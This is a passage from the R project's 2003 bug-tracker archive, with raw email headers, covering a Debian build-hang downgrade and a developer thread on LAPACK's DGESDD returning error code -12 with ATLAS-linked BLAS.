Content-Disposition: inline
In-Reply-To: <87of3kioq6.fsf@frobnitz.ddts.net>
User-Agent: Mutt/1.3.28i

severity 187537 wishlist
tags 187537 + upstream
thanks

I am downgrading because it a) does not affect normal build, b) does not
affect autobuilders, and c) is not related to Debian changes to the build
process as far as I can see.  a) and b) take care of the downgraded
severity, c) is for the upstream tag.

Let me know if you disagree, strongly or mildly.

Dirk

-- 
Wishful thinking can dominate much of the work of a profession for a decade,
but not indefinitely.   -- Robert Shiller, on Efficient Markets models, 2002

==> 2736.followup.1 <==
From edd@debian.org Mon Apr  7 04:31:13 2003
Received: from sonny.eddelbuettel.com (mail@12-250-182-80.client.attbi.com [12.250.182.80])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h372VCpD019863
	for <R-bugs@biostat.ku.dk>; Mon, 7 Apr 2003 04:31:13 +0200 (MET DST)
Received: from edd by sonny.eddelbuettel.com with local (Exim 3.35 #1 (Debian))
	id 192MPd-0004b7-00; Sun, 06 Apr 2003 21:31:09 -0500
Date: Sun, 6 Apr 2003 21:31:09 -0500
From: Dirk Eddelbuettel <edd@debian.org>
To: edd@debian.org
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: [Rd] Re: Bug#187537: r-base: FTBFS: hangs in tcltk test (PR#2736)
Message-ID: <20030407023109.GA17645@sonny.eddelbuettel.com>
References: <200304070220.h372KVpD019838@pubhealth.ku.dk>
Mime-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
In-Reply-To: <200304070220.h372KVpD019838@pubhealth.ku.dk>
User-Agent: Mutt/1.3.28i


Damn. That was meant for control@bugs.debian.org.  Sorry for the line noise.

Dirk

On Mon, Apr 07, 2003 at 04:20:31AM +0200, edd@debian.org wrote:
> severity 187537 wishlist
> tags 187537 + upstream
> thanks
> 
> I am downgrading because it a) does not affect normal build, b) does not
> affect autobuilders, and c) is not related to Debian changes to the build
> process as far as I can see.  a) and b) take care of the downgraded
> severity, c) is for the upstream tag.
> 
> Let me know if you disagree, strongly or mildly.
> 
> Dirk
> 
> -- 
> Wishful thinking can dominate much of the work of a profession for a decade,
> but not indefinitely.   -- Robert Shiller, on Efficient Markets models, 2002
> 
> ______________________________________________
> R-devel@stat.math.ethz.ch mailing list
> https://www.stat.math.ethz.ch/mailman/listinfo/r-devel
> 

-- 
Wishful thinking can dominate much of the work of a profession for a decade,
but not indefinitely.   -- Robert Shiller, on Efficient Markets models, 2002

==> 2736.audit <==
Wed Apr  9 12:59:59 2003	ripley	changed notes
Wed Apr  9 12:59:59 2003	ripley	foobar
Wed Apr  9 13:01:29 2003	ripley	moved from incoming to System-specific
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2822 *
Subject: "LAPACK routine DGESDD gave error code -12" with Debian
From: Ramon Diaz <rdiaz@cnio.es>
Date: Tue, 22 Apr 2003 20:06:21 +0200
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2822 <==
From rdiaz@cnio.es Tue Apr 22 20:07:35 2003
Received: from super-lopez.cnio.es (super-lopez.cnio.es [193.147.150.135])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h3MI7ZpD014607
	for <r-bugs@biostat.ku.dk>; Tue, 22 Apr 2003 20:07:35 +0200 (MET DST)
Received: from filemon.cnio.es ([10.5.1.10]) by super-lopez.cnio.es with Microsoft SMTPSVC(5.0.2195.2966);
	 Tue, 22 Apr 2003 20:07:30 +0200
Received: from afrodita ([10.2.1.72]) by filemon.cnio.es with Microsoft SMTPSVC(5.0.2195.2966);
	 Tue, 22 Apr 2003 20:07:30 +0200
From: Ramon Diaz <rdiaz@cnio.es>
To: r-bugs@biostat.ku.dk
Subject: "LAPACK routine DGESDD gave error code -12" with Debian
Date: Tue, 22 Apr 2003 20:06:21 +0200
User-Agent: KMail/1.5.1
MIME-Version: 1.0
Content-Type: text/plain;
  charset="iso-8859-1"
Content-Disposition: inline
Message-Id: <200304222006.21884.rdiaz@cnio.es>
X-OriginalArrivalTime: 22 Apr 2003 18:07:30.0071 (UTC) FILETIME=[0A183270:01C308FA]
Content-Transfer-Encoding: 8bit
X-MIME-Autoconverted: from quoted-printable to 8bit by pubhealth.ku.dk id h3MI7ZpD014607

Dear All,

Under Debian GNU/Linux La.svd (with method = "dgesdd") sometimes gives the 
error

"Error in La.svd(data, nu = 0, nv = min(nrow, ncol), method = "dgesdd") : 
	LAPACK routine DGESDD gave error code -12"

It seems not to depend on the data per se, but on the relationship between 
numbers of rows and columns. 

For example, if the number of columns is 100, La.svd will fail when the number 
of rows is 56, but not if it is 55 or 57. It will not fail if we use 
"dgesvd". If the number of columns is 51, La.svd fails when the number of 
rows is between 29 and 50 if we use "dgesdd".

This happens if I use the latest deb packages (and thus ATLAS, etc). It does 
not happen if I build R in this same machine with "--without-blas" (where 
make check reports no errors). In case it matters, the bug does not show up 
in a different machine with Windwos 2000 and the Rblas.dll linked against 
ATLAS provided in http://cran.r-project.org/bin/windows/contrib/ATLAS/P4).

I understand this is probably related to the issues mentioned in R-admin about 
LAPACK 3.0 and some of the issues recently discussed in this list by M. 
Burger, D. Bates and D. Eddelbuettel. Are there any workarounds (besides not 
using ATLAS at all?).


Ramón

********************************
An example of failure:
> ## ncol = 100
> nrow <- 56
> ncol <- 100
> data <- matrix(1:(nrow * ncol), ncol = ncol)
> ## you get the errors if you use any other data
> ## such as data <- matrix(rnorm(nrow * ncol), ncol = ncol)
> svd(data) ## error
> La.svd(data, nu = 0,
             nv = min(nrow, ncol), method = "dgesdd") ## error
> La.svd(data, nu = 0,
             nv = min(nrow, ncol), method = "dgesvd") ## OK

> ##ncol = 51; it fails with nrow in [29, 50]
*************************

> ## version that crashes
> version 
         _                
platform i386-pc-linux-gnu
arch     i386             
os       linux-gnu        
system   i386, linux-gnu  
status                    
major    1                
minor    7.0              
year     2003             
month    04               
day      16               
language R        
*****************************
> ## version "--without-blas" that does not crash
> version
         _  
platform i686-pc-linux-gnu
arch     i686             
os       linux-gnu        
system   i686, linux-gnu  
status                    
major    1                
minor    7.0              
year     2003             
month    04               
day      16               
language R   


-----
Ramón Díaz-Uriarte
Bioinformatics Unit
Centro Nacional de Investigaciones Oncológicas (CNIO)
(Spanish National Cancer Center)
Melchor Fernández Almagro, 3
28029 Madrid (Spain)
Fax: +-34-91-224-6972
Phone: +-34-91-224-6900

http://bioinfo.cnio.es/~rdiaz




==> 2822.followup.1 <==
From edd@debian.org Wed Apr 23 02:32:53 2003
Received: from sonny.eddelbuettel.com (mail@12-250-182-80.client.attbi.com [12.250.182.80])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h3N0WqpD016059
	for <R-bugs@biostat.ku.dk>; Wed, 23 Apr 2003 02:32:52 +0200 (MET DST)
Received: from edd by sonny.eddelbuettel.com with local (Exim 3.35 #1 (Debian))
	id 1988Bq-00078P-00; Tue, 22 Apr 2003 19:32:46 -0500
Date: Tue, 22 Apr 2003 19:32:46 -0500
From: Dirk Eddelbuettel <edd@debian.org>
To: rdiaz@cnio.es
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk, kurt.hornik@r-project.org,
   camm@enhanced.com
Subject: Re: [Rd] "LAPACK routine DGESDD gave error code -12" with Debian (PR#2822)
Message-ID: <20030423003246.GA27400@sonny.eddelbuettel.com>
References: <200304221807.h3MI7apD014611@pubhealth.ku.dk>
Mime-Version: 1.0
Content-Type: text/plain; charset=unknown-8bit
Content-Disposition: inline
Content-Transfer-Encoding: 8bit
In-Reply-To: <200304221807.h3MI7apD014611@pubhealth.ku.dk>
User-Agent: Mutt/1.3.28i

On Tue, Apr 22, 2003 at 08:07:36PM +0200, rdiaz@cnio.es wrote:
> Dear All,
> 
> Under Debian GNU/Linux La.svd (with method = "dgesdd") sometimes gives the 
> error
> 
> "Error in La.svd(data, nu = 0, nv = min(nrow, ncol), method = "dgesdd") : 
> 	LAPACK routine DGESDD gave error code -12"
> 
> It seems not to depend on the data per se, but on the relationship between 
> numbers of rows and columns. 
> 
> For example, if the number of columns is 100, La.svd will fail when the number 
> of rows is 56, but not if it is 55 or 57. It will not fail if we use 
> "dgesvd". If the number of columns is 51, La.svd fails when the number of 
> rows is between 29 and 50 if we use "dgesdd".
> 
> This happens if I use the latest deb packages (and thus ATLAS, etc). It does 
> not happen if I build R in this same machine with "--without-blas" (where 
> make check reports no errors). In case it matters, the bug does not show up 
> in a different machine with Windwos 2000 and the Rblas.dll linked against 
> ATLAS provided in http://cran.r-project.org/bin/windows/contrib/ATLAS/P4).
> 
> I understand this is probably related to the issues mentioned in R-admin about 
> LAPACK 3.0 and some of the issues recently discussed in this list by M. 
> Burger, D. Bates and D. Eddelbuettel. Are there any workarounds (besides not 
> using ATLAS at all?).

We should probably talk to Camm, the Atlas maintainer. Note how on recent
upgrades he inserted the note (cf /var/lib/dpkg/info/atlas2-3dnow.templates
on my Athlon system) via debconf:

   Template: atlas2-3dnow/3dnow_warning
   Type: note
   Description: 3dnow arithmetic is not IEEE compliant
    Please note that 3dnow arithmetic does not furnish several results
    required by the IEEE standard, and may therefore cause errors in code
    which needs to trap NaN and Inf results, for example.  The
    atlas2-3dnow binaries make heavy use of the 3dnow extensions.
    Please see the accompanying file /usr/share/doc/atlas2-3dnow/3DNow.txt
    for details.
      
I know Camm is on a sabbatical but will CC him nonetheless.

Dirk

> Ramón
> 
> ********************************
> An example of failure:
> > ## ncol = 100
> > nrow <- 56
> > ncol <- 100
> > data <- matrix(1:(nrow * ncol), ncol = ncol)
> > ## you get the errors if you use any other data
> > ## such as data <- matrix(rnorm(nrow * ncol), ncol = ncol)
> > svd(data) ## error
> > La.svd(data, nu = 0,
>              nv = min(nrow, ncol), method = "dgesdd") ## error
> > La.svd(data, nu = 0,
>              nv = min(nrow, ncol), method = "dgesvd") ## OK
> 
> > ##ncol = 51; it fails with nrow in [29, 50]
> *************************
> 
> > ## version that crashes
> > version 
>          _                
> platform i386-pc-linux-gnu
> arch     i386             
> os       linux-gnu        
> system   i386, linux-gnu  
> status                    
> major    1                
> minor    7.0              
> year     2003             
> month    04               
> day      16               
> language R        
> *****************************
> > ## version "--without-blas" that does not crash
> > version
>          _  
> platform i686-pc-linux-gnu
> arch     i686             
> os       linux-gnu        
> system   i686, linux-gnu  
> status                    
> major    1                
> minor    7.0              
> year     2003             
> month    04               
> day      16               
> language R   
> 
> 
> -----
> Ramón Díaz-Uriarte
> Bioinformatics Unit
> Centro Nacional de Investigaciones Oncológicas (CNIO)
> (Spanish National Cancer Center)
> Melchor Fernández Almagro, 3
> 28029 Madrid (Spain)
> Fax: +-34-91-224-6972
> Phone: +-34-91-224-6900
> 
> http://bioinfo.cnio.es/~rdiaz
> 
> ______________________________________________
> R-devel@stat.math.ethz.ch mailing list
> https://www.stat.math.ethz.ch/mailman/listinfo/r-devel
> 

-- 
Don't drink and derive. Alcohol and algebra don't mix.

==> 2822.followup.2 <==
From camm@enhanced.com Thu Apr 24 02:01:03 2003
Received: from intech19.enhanced.com (h-66-134-96-17.PHLAPAFG.covad.net [66.134.96.17])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h3O012pD028248
	for <R-bugs@biostat.ku.dk>; Thu, 24 Apr 2003 02:01:03 +0200 (MET DST)
Received: from camm by intech19.enhanced.com with local (Exim 3.35 #1 (Debian))
	id 198U9f-0001wP-00; Wed, 23 Apr 2003 19:59:59 -0400
To: Dirk Eddelbuettel <edd@debian.org>
Cc: rdiaz@cnio.es, r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk,
   kurt.hornik@r-project.org
Subject: Re: [Rd] "LAPACK routine DGESDD gave error code -12" with Debian (PR#2822)
References: <200304221807.h3MI7apD014611@pubhealth.ku.dk>
	<20030423003246.GA27400@sonny.eddelbuettel.com>
From: Camm Maguire <camm@enhanced.com>
Date: 23 Apr 2003 19:59:59 -0400
In-Reply-To: <20030423003246.GA27400@sonny.eddelbuettel.com>
Message-ID: <54el3swyrk.fsf@intech19.enhanced.com>
Lines: 171
User-Agent: Gnus/5.09 (Gnus v5.9.0) Emacs/21.2
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
Content-Transfer-Encoding: 8bit
X-MIME-Autoconverted: from quoted-printable to 8bit by pubhealth.ku.dk id h3O012pD028248

Greetings!

1) This should have nothing to do with atlas, as atlas does not tune
   this routine, meaning you are using the stock routine from lapack.

nm --dynamic /usr/lib/liblapack_atlas.so.2.3 |grep dge
00003810 T ATL_dgetrf
00003590 T ATL_dgetrfC
00003870 T ATL_dgetrfR
00003ae0 T ATL_dgetrs
000047f0 T atl_f77wrap_dgesv__
000048b0 T atl_f77wrap_dgetnb__
000048e0 T atl_f77wrap_dgetrf__
00004970 T atl_f77wrap_dgetrs__
         U cblas_dgemm
00007c68 T clapack_dgesv
00007da0 T clapack_dgetrf
00007e90 T clapack_dgetrs
00009430 T dgesv_
00009500 T dgetrf_
000095b0 T dgetrs_
intech19:/fix/t2/camm/gcl-2.5.2$ 

   You can check this by verifying that the difficulty persists if you
   set the LD_LIBRARY_PATH environment variable to /usr/lib

2) Given the error code, and the scaling behavior with matrix size,
   I'd say the lwork parameter (size of the work array) passed to
   dgesdd is not always large enough, i.e. is not scaling properly
   with n,m.  Please see 'man dgesdd' for interpretations of the error
   code.  It is the responsibility of the calling routine to allocate
   and pass the work array to dgesdd.  With most lapack routines, one
   can make a 'workspace query' call first by setting lwork to -1, or
   some such.  check the man page for details.  This of course would
   have to be done with each change in n,m.  Alternatively, you could
   take the minimum workspace requirements from the manpage.  

   lapack is the relevant lib, so I don't know what --without-blas is
   supposed to do.  And working under windows, while nice, doesn't
   exactly inspire confidence :-).

I am in general away from email until 6/1, so correspondence will be
spotty.

Take care,

Dirk Eddelbuettel <edd@debian.org> writes:

> On Tue, Apr 22, 2003 at 08:07:36PM +0200, rdiaz@cnio.es wrote:
> > Dear All,
> > 
> > Under Debian GNU/Linux La.svd (with method = "dgesdd") sometimes gives the 
> > error
> > 
> > "Error in La.svd(data, nu = 0, nv = min(nrow, ncol), method = "dgesdd") : 
> > 	LAPACK routine DGESDD gave error code -12"
> > 
> > It seems not to depend on the data per se, but on the relationship between 
> > numbers of rows and columns. 
> > 
> > For example, if the number of columns is 100, La.svd will fail when the number 
> > of rows is 56, but not if it is 55 or 57. It will not fail if we use 
> > "dgesvd". If the number of columns is 51, La.svd fails when the number of 
> > rows is between 29 and 50 if we use "dgesdd".
> > 
> > This happens if I use the latest deb packages (and thus ATLAS, etc). It does 
> > not happen if I build R in this same machine with "--without-blas" (where 
> > make check reports no errors). In case it matters, the bug does not show up 
> > in a different machine with Windwos 2000 and the Rblas.dll linked against 
> > ATLAS provided in http://cran.r-project.org/bin/windows/contrib/ATLAS/P4).
> > 
> > I understand this is probably related to the issues mentioned in R-admin about 
> > LAPACK 3.0 and some of the issues recently discussed in this list by M. 
> > Burger, D. Bates and D. Eddelbuettel. Are there any workarounds (besides not 
> > using ATLAS at all?).
> 
> We should probably talk to Camm, the Atlas maintainer. Note how on recent
> upgrades he inserted the note (cf /var/lib/dpkg/info/atlas2-3dnow.templates
> on my Athlon system) via debconf:
> 
>    Template: atlas2-3dnow/3dnow_warning
>    Type: note
>    Description: 3dnow arithmetic is not IEEE compliant
>     Please note that 3dnow arithmetic does not furnish several results
>     required by the IEEE standard, and may therefore cause errors in code
>     which needs to trap NaN and Inf results, for example.  The
>     atlas2-3dnow binaries make heavy use of the 3dnow extensions.
>     Please see the accompanying file /usr/share/doc/atlas2-3dnow/3DNow.txt
>     for details.
>       
> I know Camm is on a sabbatical but will CC him nonetheless.
> 
> Dirk
> 
> > Ramón
> > 
> > ********************************
> > An example of failure:
> > > ## ncol = 100
> > > nrow <- 56
> > > ncol <- 100
> > > data <- matrix(1:(nrow * ncol), ncol = ncol)
> > > ## you get the errors if you use any other data
> > > ## such as data <- matrix(rnorm(nrow * ncol), ncol = ncol)
> > > svd(data) ## error
> > > La.svd(data, nu = 0,
> >              nv = min(nrow, ncol), method = "dgesdd") ## error
> > > La.svd(data, nu = 0,
> >              nv = min(nrow, ncol), method = "dgesvd") ## OK
> > 
> > > ##ncol = 51; it fails with nrow in [29, 50]
> > *************************
> > 
> > > ## version that crashes
> > > version 
> >          _                
> > platform i386-pc-linux-gnu
> > arch     i386             
> > os       linux-gnu        
> > system   i386, linux-gnu  
> > status                    
> > major    1                
> > minor    7.0              
> > year     2003             
> > month    04               
> > day      16               
> > language R        
> > *****************************
> > > ## version "--without-blas" that does not crash
> > > version
> >          _  
> > platform i686-pc-linux-gnu
> > arch     i686             
> > os       linux-gnu        
> > system   i686, linux-gnu  
> > status                    
> > major    1                
> > minor    7.0              
> > year     2003             
> > month    04               
> > day      16               
> > language R   
> > 
> > 
> > -----
> > Ramón Díaz-Uriarte
> > Bioinformatics Unit
> > Centro Nacional de Investigaciones Oncológicas (CNIO)
> > (Spanish National Cancer Center)
> > Melchor Fernández Almagro, 3
> > 28029 Madrid (Spain)
> > Fax: +-34-91-224-6972
> > Phone: +-34-91-224-6900
> > 
> > http://bioinfo.cnio.es/~rdiaz
> > 
> > ______________________________________________
> > R-devel@stat.math.ethz.ch mailing list
> > https://www.stat.math.ethz.ch/mailman/listinfo/r-devel
> > 
> 
> -- 
> Don't drink and derive. Alcohol and algebra don't mix.
> 
> 
> 

-- 
Camm Maguire			     			camm@enhanced.com
==========================================================================
"The earth is but one country, and mankind its citizens."  --  Baha'u'llah


==> 2822.reply.1 <==
From p.dalgaard@biostat.ku.dk Thu Apr 24 13:25:26 2003
Received: from blueberry.kubism.ku.dk (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h3OBPQpD004849;
	Thu, 24 Apr 2003 13:25:26 +0200 (MET DST)
Received: from blueberry.kubism.ku.dk (localhost.localdomain [127.0.0.1])
	by blueberry.kubism.ku.dk (8.12.8/8.12.8) with ESMTP id h3OBSN8e026637;
	Thu, 24 Apr 2003 13:28:23 +0200
Received: (from pd@localhost)
	by blueberry.kubism.ku.dk (8.12.8/8.12.8/Submit) id h3OBSMe4026633;
	Thu, 24 Apr 2003 13:28:22 +0200
X-Authentication-Warning: blueberry.kubism.ku.dk: pd set sender to p.dalgaard@biostat.ku.dk using -f
To: Camm Maguire <camm@enhanced.com>
Cc: Dirk Eddelbuettel <edd@debian.org>, r-devel@stat.math.ethz.ch,
   kurt.hornik@r-project.org, R-bugs@biostat.ku.dk, rdiaz@cnio.es
Subject: Re: [Rd] "LAPACK routine DGESDD gave error code -12" with Debian (PR#2822)
References: <200304221807.h3MI7apD014611@pubhealth.ku.dk>
	<20030423003246.GA27400@sonny.eddelbuettel.com>
	<54el3swyrk.fsf@intech19.enhanced.com>
From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Date: 24 Apr 2003 13:28:21 +0200
In-Reply-To: <54el3swyrk.fsf@intech19.enhanced.com>
Message-ID: <x2u1co878q.fsf@biostat.ku.dk>
Lines: 58
User-Agent: Gnus/5.09 (Gnus v5.9.0) Emacs/21.2
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
Content-Transfer-Encoding: 8bit

Camm Maguire <camm@enhanced.com> writes:

> 2) Given the error code, and the scaling behavior with matrix size,
>    I'd say the lwork parameter (size of the work array) passed to
>    dgesdd is not always large enough, i.e. is not scaling properly
>    with n,m.  Please see 'man dgesdd' for interpretations of the error
>    code.  It is the responsibility of the calling routine to allocate
>    and pass the work array to dgesdd.  With most lapack routines, one
>    can make a 'workspace query' call first by setting lwork to -1, or
>    some such.  check the man page for details.  This of course would
>    have to be done with each change in n,m.  Alternatively, you could
>    take the minimum workspace requirements from the manpage.  

Right, but that's actually what we do, use the workspace query. It's
all very weird, because the -12 value indicates that the lwork
parameter is wrong, but it is computed from an exactly identical call,
except lwork=-l:

        lwork = -1;

        F77_CALL(dgesdd)(CHAR(STRING_ELT(jobu, 0)),
                         &n, &p, xvals, &n, REAL(s),
                         REAL(u), &ldu,
                         REAL(v), &ldvt,
                         &tmp, &lwork, iwork, &info);
        lwork = (int) tmp;

        work = (double *) R_alloc(lwork, sizeof(double));
        F77_CALL(dgesdd)(CHAR(STRING_ELT(jobu, 0)),
                         &n, &p, xvals, &n, REAL(s),
                         REAL(u), &ldu,
                         REAL(v), &ldvt,
                         work, &lwork, iwork, &info);


Also, this must be happening in the early parts of DGESDD which seem
to be all integer storage size calculations and so shouldn't need the
BLAS. Nevertheless people are seeing different behaviour when linking
against different BLAS libraries.
 
There are a lot of calls similar to this one, though:

      WRKBL = M + M*ILAENV( 1, 'DGELQF', ' ', M, N, -1, -1 )

so whether or not the BLAS is being used is hard to tell precisely.

>    lapack is the relevant lib, so I don't know what --without-blas is
>    supposed to do.  And working under windows, while nice, doesn't
>    exactly inspire confidence :-).

--without-blas means to use generic blas routines in the R
sources rather than any (tuned) system set.

-- 
   O__  ---- Peter Dalgaard             Blegdamsvej 3  
  c/ /'_ --- Dept. of Biostatistics     2200 Cph. N   
 (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907

==> 2822.reply.2 <==
From bates@bates4.stat.wisc.edu Thu Apr 24 19:03:24 2003
Received: from bates4.stat.wisc.edu (mail@bates4.stat.wisc.edu [128.105.174.134])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h3OH3OpD008663;
	Thu, 24 Apr 2003 19:03:24 +0200 (MET DST)
Received: from bates by bates4.stat.wisc.edu with local (Exim 3.36 #1 (Debian))
	id 198k81-0004LK-00; Thu, 24 Apr 2003 12:03:21 -0500
To: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Cc: Camm Maguire <camm@enhanced.com>, Dirk Eddelbuettel <edd@debian.org>,
   r-devel@stat.math.ethz.ch, kurt.hornik@r-project.org, R-bugs@biostat.ku.dk,
   rdiaz@cnio.es
Subject: Re: [Rd] "LAPACK routine DGESDD gave error code -12" with Debian (PR#2822)
References: <200304221807.h3MI7apD014611@pubhealth.ku.dk>
	<20030423003246.GA27400@sonny.eddelbuettel.com>
	<54el3swyrk.fsf@intech19.enhanced.com> <x2u1co878q.fsf@biostat.ku.dk>
From: Douglas Bates <bates@stat.wisc.edu>
Date: 24 Apr 2003 12:03:21 -0500
In-Reply-To: <x2u1co878q.fsf@biostat.ku.dk>
Message-ID: <6r7k9j25gm.fsf@bates4.stat.wisc.edu>
Lines: 35
User-Agent: Gnus/5.0808 (Gnus v5.8.8) XEmacs/21.4 (Common Lisp)
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Sender: Douglas Bates <bates@bates4.stat.wisc.edu>

Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk> writes:

> Camm Maguire <camm@enhanced.com> writes:
> 
> > 2) Given the error code, and the scaling behavior with matrix size,
> >    I'd say the lwork parameter (size of the work array) passed to
> >    dgesdd is not always large enough, i.e. is not scaling properly
> >    with n,m.  Please see 'man dgesdd' for interpretations of the error
> >    code.  It is the responsibility of the calling routine to allocate
> >    and pass the work array to dgesdd.  With most lapack routines, one
> >    can make a 'workspace query' call first by setting lwork to -1, or
> >    some such.  check the man page for details.  This of course would
> >    have to be done with each change in n,m.  Alternatively, you could
> >    take the minimum workspace requirements from the manpage.  
> 
> Right, but that's actually what we do, use the workspace query. It's
> all very weird, because the -12 value indicates that the lwork
> parameter is wrong, but it is computed from an exactly identical call,
> except lwork=-l:
> 
>         lwork = -1;
> 
>         F77_CALL(dgesdd)(CHAR(STRING_ELT(jobu, 0)),
>                          &n, &p, xvals, &n, REAL(s),
>                          REAL(u), &ldu,
>                          REAL(v), &ldvt,
>                          &tmp, &lwork, iwork, &info);
>         lwork = (int) tmp;

It looks like a problem in ilaenv, the Lapack routine that returns the
tuning parameters, like the optimal temporary storage size, for
various Lapack routines.  The value returned in tmp will depend upon
the results of several calls to ilaenv.  These results can vary between
different implementations of the blas (or atlas).


==> 2822.followup.3 <==
From camm@enhanced.com Fri Apr 25 15:28:50 2003
Received: from intech19.enhanced.com (h-66-134-96-17.PHLAPAFG.covad.net [66.134.96.17])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h3PDSnpD017958;
	Fri, 25 Apr 2003 15:28:50 +0200 (MET DST)
Received: from camm by intech19.enhanced.com with local (Exim 3.35 #1 (Debian))
	id 1993Fi-0007EL-00; Fri, 25 Apr 2003 09:28:34 -0400
To: Douglas Bates <bates@stat.wisc.edu>
Cc: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>,
   Dirk Eddelbuettel <edd@debian.org>, r-devel@stat.math.ethz.ch,
   kurt.hornik@r-project.org, R-bugs@biostat.ku.dk, rdiaz@cnio.es
Subject: Re: [Rd] "LAPACK routine DGESDD gave error code -12" with Debian (PR#2822)
References: <200304221807.h3MI7apD014611@pubhealth.ku.dk>
	<20030423003246.GA27400@sonny.eddelbuettel.com>
	<54el3swyrk.fsf@intech19.enhanced.com> <x2u1co878q.fsf@biostat.ku.dk>
	<6r7k9j25gm.fsf@bates4.stat.wisc.edu>
From: Camm Maguire <camm@enhanced.com>
Date: 25 Apr 2003 09:28:33 -0400
In-Reply-To: <6r7k9j25gm.fsf@bates4.stat.wisc.edu>
Message-ID: <541xzqd7um.fsf@intech19.enhanced.com>
Lines: 77
User-Agent: Gnus/5.09 (Gnus v5.9.0) Emacs/21.2
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii

Greetings!

Douglas Bates <bates@stat.wisc.edu> writes:

> Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk> writes:
> 
> > Camm Maguire <camm@enhanced.com> writes:
> > 
> > > 2) Given the error code, and the scaling behavior with matrix size,
> > >    I'd say the lwork parameter (size of the work array) passed to
> > >    dgesdd is not always large enough, i.e. is not scaling properly
> > >    with n,m.  Please see 'man dgesdd' for interpretations of the error
> > >    code.  It is the responsibility of the calling routine to allocate
> > >    and pass the work array to dgesdd.  With most lapack routines, one
> > >    can make a 'workspace query' call first by setting lwork to -1, or
> > >    some such.  check the man page for details.  This of course would
> > >    have to be done with each change in n,m.  Alternatively, you could
> > >    take the minimum workspace requirements from the manpage.  
> > 
> > Right, but that's actually what we do, use the workspace query. It's
> > all very weird, because the -12 value indicates that the lwork
> > parameter is wrong, but it is computed from an exactly identical call,
> > except lwork=-l:
> > 
> >         lwork = -1;
> > 
> >         F77_CALL(dgesdd)(CHAR(STRING_ELT(jobu, 0)),
> >                          &n, &p, xvals, &n, REAL(s),
> >                          REAL(u), &ldu,
> >                          REAL(v), &ldvt,
> >                          &tmp, &lwork, iwork, &info);
> >         lwork = (int) tmp;
> 
> It looks like a problem in ilaenv, the Lapack routine that returns the
> tuning parameters, like the optimal temporary storage size, for
> various Lapack routines.  The value returned in tmp will depend upon
> the results of several calls to ilaenv.  These results can vary between
> different implementations of the blas (or atlas).
> 

Just a note that you should check the returned info value on the
workspace call to make sure tmp has been filled in.  (the man page
says this is done only if the other parameters are valid.)

Does this problem vary with blas, and if so, how?  You can run under
whatever blas you want, including reference, via the LD_LIBRARY_PATH
variable.  Asuming you've installed all the i386 atlas versions and the blas
package:

LD_LIBRARY_PATH     used blas:

/usr/lib                reference
/usr/lib/atlas          base vanilla i386 atlas
/usr/lib/{sse,sse2,3dnow}/atlas    atlas with ISA extensions


ilaenv might possibly be an issue, but only realistically if the
problem blas is coming from the 3dnow atlas.  When I put together the
lapack package, I read in the lapack notes how many of the ilaenv
constants can be hardwired, saving a certain amount of time on the
first call.  I chose not to do this only because of the existence of
the 3dnow, non-ieee compliant blas option at runtime, as one of the
parameters pertains directly to ieee.  So ilaenv is calculating its
parameters n first call at runtime on Debian.  I'm dubious as to the
relevance of this, though, as this should only kick in for single
precision if at all, and should not affect integer values in any case.

Take care,

> 
> 
> 

-- 
Camm Maguire			     			camm@enhanced.com
==========================================================================
"The earth is but one country, and mankind its citizens."  --  Baha'u'llah

==> 2822.audit <==
Thu May 29 09:51:58 2003	ripley	moved from incoming to System-specific
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2823 *
Subject: Re: [Rd] 
From: Kurt Hornik <hornik@ci.tuwien.ac.at>
Date: Tue, 22 Apr 2003 20:15:19 +0200
--part of 2822
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2823 <==
From hornik@ci.tuwien.ac.at Tue Apr 22 20:18:02 2003
Received: from isis.wu-wien.ac.at (isis.wu-wien.ac.at [137.208.3.42])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h3MIHxpD014666
	for <R-bugs@biostat.ku.dk>; Tue, 22 Apr 2003 20:18:01 +0200 (MET DST)
Received: from mithrandir.hornik.net (mail@wu057056.wu-wien.ac.at [137.208.57.56])
	by isis.wu-wien.ac.at (8.12.8/8.12.6) with ESMTP id h3MIHvTn111298;
	Tue, 22 Apr 2003 20:17:57 +0200
	(envelope-from hornik@ci.tuwien.ac.at)
Received: from hornik by mithrandir.hornik.net with local (Exim 3.36 #1 (Debian))
	id 1982Ij-0003cy-00; Tue, 22 Apr 2003 20:15:29 +0200
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
Content-Transfer-Encoding: 8bit
Message-ID: <16037.34487.349521.950443@mithrandir.hornik.net>
Date: Tue, 22 Apr 2003 20:15:19 +0200
To: rdiaz@cnio.es
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: [Rd] 
	"LAPACK routine DGESDD gave error code -12" with Debian (PR#2822)
In-Reply-To: <200304221807.h3MI7apD014611@pubhealth.ku.dk>
